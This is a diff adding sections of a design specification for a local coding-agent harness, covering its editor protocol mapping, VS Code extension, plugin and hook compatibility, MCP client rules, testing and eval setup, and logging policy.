+    A-->>C: capabilities
+    C->>A: session/new or session/load
+    A-->>C: session id
+    C->>A: session/prompt
+    A->>L: chat request
+    L-->>A: streamed reply with tool call
+    A-->>C: session/update (chunks, tool_call)
+    A->>C: session/request_permission
+    C-->>A: outcome
+    A-->>C: session/update (tool_call_update)
+    opt User presses stop
+        C-)A: session/cancel
+        Note over A: Stop work, send updates,<br/>then answer cancelled
+    end
+    A-->>C: prompt response with stop reason
+```
+
+| Direction | Methods |
+|---|---|
+| Implement | `initialize`, `authenticate` (no-op: no auth methods), `session/new`, `session/load`, `session/prompt`, `session/cancel`, `session/set_mode` |
+| Send | `session/update`, `session/request_permission` |
+| Use if advertised | `fs/read_text_file` (so `Read` sees unsaved editor buffers) |
+
+| `AgentEvent` | `session/update` variant |
+|---|---|
+| `TextDelta` | `agent_message_chunk` |
+| `ThinkingDelta` | `agent_thought_chunk` |
+| `ToolStarted` | `tool_call` (`toolCallId`, `title`, `kind`, `status`) |
+| `ToolFinished` | `tool_call_update` (`status`, `content`) |
+| `Usage` | `usage_update` (`used`, `size`) |
+| `Notice` | `notice`, if the client has `session.notices`; otherwise a message chunk |
+| `Compaction` | `compaction_update`, if the client has `session.compaction` |
+
+Stop reasons: `end_turn`, `max_tokens`, `max_turn_requests`, `refusal`, `cancelled`.
+
+**Cancellation:** on `session/cancel`, stop model requests and tools at once, send final updates *before* answering the prompt, and respond with `cancelled`. Treat aborted-operation errors as cancellation rather than failures.
+
+`UNVERIFIED`, check against `v1::schema`: permission option kinds (expected `allow_once`, `allow_always`, `reject_once`, `reject_always`), tool `kind` values (expected `read`, `edit`, `delete`, `move`, `search`, `execute`, `think`, `fetch`, `other`), diff content in tool calls, and `mcpServers` on `session/new`. If `session/new` passes MCP servers, treat them as user-approved, since they come from the user's editor.
+
+### Developer experience requirements
+
+These apply to every front end where they fit. Evidence is in [RESEARCH.md](RESEARCH.md#developers-in-the-ide).
+
+| Requirement | Rule | Tasks |
+|---|---|---|
+| **Status** | Always show the phase (loading model, processing prompt, generating, running tool), elapsed time and context used. `/v1` has no prompt-progress events, so show elapsed time rather than a made-up progress bar | T5.3 |
+| **Layered detail** | One line per tool call, with output on expansion. Never stream raw output into the main view | T5.3 |
+| **Steering** | Stop works at any moment, and the next prompt continues from consistent history, with interrupted calls marked as cancelled | T1.7 |
+| **Plan first** | `/plan` runs a turn in read-only mode and asks for a plan with assumptions. Carrying it out is a separate action by the developer | T5.9 |
+| **Turn summary** | Built from the tool log, never the model's claims: files changed, commands run, exit codes, and a plain statement if no tests ran | T5.7 |
+| **Change-set review** | Overview (files, lines, risk labels), then file (native diff), then chunk, with free navigation between them. Each `Edit` call is one chunk, shown with the reasoning that produced it. Revert per file from checkpoints | T5.8 |
+| **No false assurance** | Never show a score, tick or wording implying that code is correct or secure unless a tool actually verified it | All |
+| **No constant suggestions** | Inference only runs when the developer asks for it | All |
+
+**System prompt contract (T2.13).** Keep it short, since it sits in the prefix. Ask the model to state assumptions, say when it's unsure, disagree when a request looks wrong, make small steps, and report only what it has verified. Models won't always comply, so the turn summary doesn't depend on it.
+
+### VS Code extension
+
+See [ADR 0001](adr/0001-rust-only-with-minimal-vscode-glue.md).
+
+```mermaid
+flowchart TB
+    subgraph vscode["VS Code"]
+        subgraph host["Extension host (Node)"]
+            glue["Generated JS glue"] --> ext["harness-vscode.wasm<br/>activate, deactivate"]
+        end
+        subgraph webview["Webview"]
+            ui["harness-vscode-ui.wasm"]
+        end
+        ext <-->|"postMessage"| ui
+    end
+
+    ext <-->|"spawned child<br/>newline JSON over stdio"| agent["harness acp<br/>native: all agent work"]
+    agent <--> lms[("LM Studio")]
+
+    classDef rust fill:#dbeafe,stroke:#2563eb,color:#1e3a8a
+    classDef generated fill:#fef3c7,stroke:#d97706,color:#78350f
+    classDef external fill:#f3f4f6,stroke:#6b7280,color:#111827
+    class ext,ui,agent rust
+    class glue generated
+    class lms external
+```
+
+Build:
+
+- Extension crate: `wasm32-unknown-unknown`, `wasm-bindgen --target nodejs`, and `main` in `package.json` points at the generated JS.
+- UI crate: `wasm-bindgen --target web`, loaded by the HTML shell.
+- Bindings: `#[wasm_bindgen(module = "vscode")]` and `module = "child_process"`, only for what's called.
+- ACP types: try the `agent-client-protocol` crate on wasm through its `Channel` or `ByteStreams` transport, keeping `JsValue` out of the connection (`JsValue` isn't `Send`). If this is too heavy, use only its schema types and frame lines by hand.
+- `cargo xtask vsix` zips `extension.vsixmanifest`, `[Content_Types].xml` and `extension/**`. Linux x64 first, with the native binary at `extension/bin/`.
+
+Features:
+
+| Feature | Mechanism |
+|---|---|
+| Chat panel | Webview view with streaming output and a stop button |
+| Edit review | On a permission request for `Write` or `Edit`, open the native diff editor via `vscode.diff`, with accept and reject |
+| Other permissions | Prompt in the panel, including "always" |
+| Tool activity | Collapsible items with status |
+| Model picker | Backed by `models` data and config |
+| Context | Active file and selection attached as prompt resources; diagnostics on request |
+| Output channel | Harness stderr |
+
+Security and accessibility requirements:
+
+- `capabilities.untrustedWorkspaces.supported = false`.
+- `harness.binaryPath` must have **`"scope": "machine"`**, so a repository's `.vscode/settings.json` can't point it at a malicious binary. The same applies to any setting that affects execution.
+- Webview CSP: `default-src 'none'; script-src ${cspSource} 'wasm-unsafe-eval'; style-src ${cspSource}`. No inline scripts; `localResourceRoots` limited to the extension directory.
+- Render model text through `pulldown-cmark` with **raw HTML escaped**, not passed through. Only allow `http`, `https` and `vscode` link schemes, opened with the editor's confirmation.
+- Validate every message between webview and extension against typed enums.
+- All controls keyboard reachable and labelled; streaming region uses `aria-live="polite"`; use VS Code theme CSS variables. Respect reduced motion.
+
+If the child exits, show the error and last stderr lines, with a restart button.
+
+## 12. Plugins
+
+Reference: [manifest](https://code.claude.com/docs/en/plugins/manifest-reference.md), [components](https://code.claude.com/docs/en/plugins/components.md), [hooks](https://code.claude.com/docs/en/hooks.md). The formats belong to Claude Code and can change. Implement the subset below and warn clearly about anything skipped; never fail silently.
+
+### Support matrix
+
+| Component | Location | First version |
+|---|---|---|
+| Manifest | `.claude-plugin/plugin.json`, optional; only `name` is required | Yes. Unknown top-level keys are warnings |
+| Skills | `skills/<name>/SKILL.md` | Yes |
+| Commands | `commands/*.md` (same frontmatter as skills) | Yes, invoked as `/<plugin>:<name>` |
+| Agents | `agents/**/*.md` | Sequential only; `name`, `description`, `model`, `tools`, `disallowedTools`, `maxTurns`. `model` values like `sonnet` map through config, or fall back to the session model |
+| Hooks | `hooks/hooks.json` | `type: "command"` only |
+| MCP servers | `.mcp.json`, with or without wrapper; `mcpServers` in manifest | Yes; `.mcpb` bundles no |
+| `userConfig` | Manifest | Yes; `sensitive` values kept out of config and session logs, and stored in a `0600` file |
+| `bin/` | Plugin root | Appended after the user's `PATH`, so it can't shadow system commands |
+| LSP, monitors, output styles, themes, channels, marketplace | | No; warn |
+| Workflows and mods | JavaScript files | **No; they need a JS runtime, which ADR 0001 excludes** |
+
+Path rules from the manifest reference: component paths must begin with `./` (`skills` may also be `.`), must exist, and must resolve inside the plugin root. `commands` and `agents` replace the default scan, `skills` adds to it, and `hooks` and `mcpServers` merge with their default files.
+
+Plugins are never read from `~/.claude`. Install them explicitly into `~/.local/share/harness/plugins/`.
+
+### Skills
+
+The prompt has an index of `name: description`, frozen at session start and subject to the budget. The `Skill` tool returns the body on demand, as an appended message. Substitute `$ARGUMENTS` (`UNVERIFIED` for the full list of substitutions; see Claude Code's skills doc).
+
+### Hooks
+
+```json
+{ "hooks": { "PostToolUse": [ { "matcher": "Write|Edit",
+  "hooks": [ { "type": "command", "command": "\"${CLAUDE_PLUGIN_ROOT}/scripts/format.sh\"", "timeout": 30 } ] } ] } }
+```
+
+Files wrap the event map in `"hooks"`; an inline manifest object doesn't.
+
+**Events supported:** `PreToolUse`, `PostToolUse`, `UserPromptSubmit`, `SessionStart`, `Stop`. Warn on any others.
+
+**Matcher:** `*`, an empty string or an omitted value matches all. Only letters, digits, `_`, `-`, spaces, `,` and `|` means an exact name or list. Anything else is an unanchored regex; Claude Code uses JS regex, and Rust's `regex` has no lookaround, so warn and skip on a pattern that doesn't compile.
+
+**Execution:** with `args`, run with no shell (exec form). Without `args`, run through the shell, because `command` may be a shell string. Default timeout 30 s; on timeout, kill it and treat it as a non-blocking error. Run hooks only from approved plugins.
+
+**Stdin JSON:**
+
+| Event | Fields, in addition to `session_id`, `transcript_path`, `cwd`, `permission_mode`, `hook_event_name` |
+|---|---|
+| `PreToolUse` | `tool_name`, `tool_input`, `tool_use_id` |
+| `PostToolUse` | Those, plus `tool_response`, `duration_ms`, and `mcp_server` for MCP tools |
+| `UserPromptSubmit` | `prompt` |
+| `SessionStart` | `source` (`startup`, `resume`, ...), `model` |
+| `Stop` | `UNVERIFIED`; read the hooks doc section before implementing |
+
+**Exit codes:** 0 means parse stdout as JSON if it's a single JSON object, otherwise plain text (added to context only for `UserPromptSubmit` and `SessionStart`). 2 blocks where the event can block, with stderr as the reason, even if JSON allowed it. Anything else is a non-blocking error and the action proceeds.
+
+**Output handled:** `continue`, `stopReason`, `systemMessage`, top-level `decision: "block"` with `reason`, and `hookSpecificOutput` with `hookEventName`, `permissionDecision` (`allow`, `deny`, `ask`, `defer`; treat `defer` as no decision), `permissionDecisionReason`, `updatedInput`, `additionalContext`, `updatedToolOutput`.
+
+Revalidate `updatedInput` against the schema, then run the permission check on the new input. Otherwise a hook-altered path could bypass the check.
+
+`additionalContext` is appended as a message, keeping the prefix stable.
+
+**Environment for hooks and plugin MCP servers:** `CLAUDE_PLUGIN_ROOT`, `CLAUDE_PLUGIN_DATA` (mapped to `~/.local/share/harness/plugins/data/<id>/`), `CLAUDE_PROJECT_DIR`, `CLAUDE_PLUGIN_OPTION_<KEY>`. `${...}` expands in `command`, `args`, `env` and skill or agent bodies. These names exist for compatibility with existing plugins.
+
+### MCP tool names
+
+`mcp__<server>__<tool>`; for plugins, `mcp__plugin_<plugin>_<server>__<tool>`. Use these in permission rules and matchers.
+
+## 13. MCP
+
+`rmcp` targets spec `2026-07-28`. Check the client API on docs.rs for the pinned version; its README doesn't include a client example.
+
+- **Transports:** stdio child process and streamable HTTP. No OAuth at first: static headers via `headers` in config, with values from environment variables.
+- **Lifecycle:** connect in the background at session start, so a slow server doesn't delay the prompt. A failed server produces a notice and the session continues without it. If it crashes mid-session, its tool calls return errors, and reconnect once.
+- **Tool list freeze:** `tools/list` results are fixed at session start per §7, with later `list_changed` notifications logged rather than applied.
+- **Results:** pass through the tool-result budget; non-text content is replaced by a short description.
+- **Pinning:** on approval, store the SHA-256 of each tool's name, description and schema. On any change, hide that tool from the model and ask again, showing what changed. This also covers plugin servers.
+- **Description scan:** at approval, flag instruction-like wording, encoded content and unusual length as a warning only. It catches part of the problem and has false positives, so it never blocks and never counts as a defence.
+- **Timeouts:** default 60 s per call, and cancellation is forwarded.
+- **Schemas:** weak models choke on large schemas, so strip `$comment`, `examples` and long descriptions in the prompt, but validate against the original.
+
+Start with tools, then resources and prompts.
+
+## 14. Testing
+
+| Layer | What | How |
+|---|---|---|
+| Unit | Parsers, budgets, rules, recovery, config merge, hook matching | Plain `#[test]`, no I/O |
+| Integration | Agent loop, provider, tools, sessions | `wiremock` fake server with fixtures in `crates/harness-core/tests/fixtures/lmstudio/`; temp directories |
+| Security | §10 invariants | `crates/harness-core/tests/security.rs` plus hostile fixture repo |
+| Protocol | ACP | In-process via the crate's `Channel` transport; mock client |
+| MCP | Client | Small test server built with `rmcp`'s server features as a dev-dependency |
+| Plugin compat | Real format | Fixture plugin with a skill, a hook and an MCP server |
+| Extension | Logic | Native tests on protocol and message-mapping code; **manual checklist** in `editors/vscode/CHECKLIST.md` for UI |
+| Evals | Real model quality | `cargo xtask eval`, outside verify |
+
+**Fixtures** are recorded from real servers by T0.3 and stored as-is, including malformed output. Never hand-edit them to make a test pass; if behaviour changes, re-record.
+
+`scripts/verify` runs `cargo fmt --check`, `cargo clippy --workspace --all-targets -- -D warnings`, `cargo test --workspace`, and `cargo check` for wasm crates with `--target wasm32-unknown-unknown`. Add `cargo audit` if the human approves the tool; it isn't installed.
+
+### Evals
+
+Each `evals/<task>/` has `task.toml` (prompt, limits), `repo/` (fixture) and `check.sh` (exit 0 means success, written so it can't be satisfied by editing the tests: tests live outside the agent's writable path, or are restored before checking). Run with sandbox on and `auto-edit` mode.
+
+Scoreboard per model: success rate, turns, wall time, tool-call parse failures, recoveries, loop stops, prompt tokens processed versus cached, re-fetches of masked output, and injection eval outcomes. Token counts alone overstate savings, so every context feature is compared with it switched off. Written as JSON and committed to `evals/results/` when a milestone closes. Model runs vary, so run each task at least 3 times with a fixed seed where supported.
+
+## 15. Error and logging policy
+
+- `harness-core` returns typed errors (`thiserror`). Only the CLI top level uses `anyhow`.
+- Users get what happened and what to do. Stack traces are for `RUST_LOG=debug` on stderr.
+- Logs exclude prompts, file contents and secrets at `info` and below. Debug-level content logging needs an explicit `HARNESS_LOG_CONTENT=1`.
+- A task panic is caught at the tool boundary and becomes a tool error. A session log write failure stops the turn, since continuing would lose data.
+
+## 16. Sources
+
+Research behind the context, review and security decisions is in [RESEARCH.md](RESEARCH.md).
+
+- LM Studio: [REST overview](https://lmstudio.ai/docs/developer/rest), [load](https://lmstudio.ai/docs/developer/rest/load), [list](https://lmstudio.ai/docs/developer/rest/list)
+- ACP: [overview](https://agentclientprotocol.com/protocol/overview), [prompt turn](https://agentclientprotocol.com/protocol/prompt-turn), [transports](https://agentclientprotocol.com/protocol/transports), [Rust crate 5.0.0](https://docs.rs/agent-client-protocol/5.0.0/agent_client_protocol/)
+- MCP: [rmcp 3.9.0](https://docs.rs/crate/rmcp/3.9.0/source/README.md), [spec 2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28)
+- Claude Code: [plugin manifest](https://code.claude.com/docs/en/plugins-reference), [components](https://code.claude.com/docs/en/plugins/components.md), [hooks](https://code.claude.com/docs/en/hooks)
+- VS Code: [WebAssembly](https://code.visualstudio.com/blogs/2024/05/08/wasm)
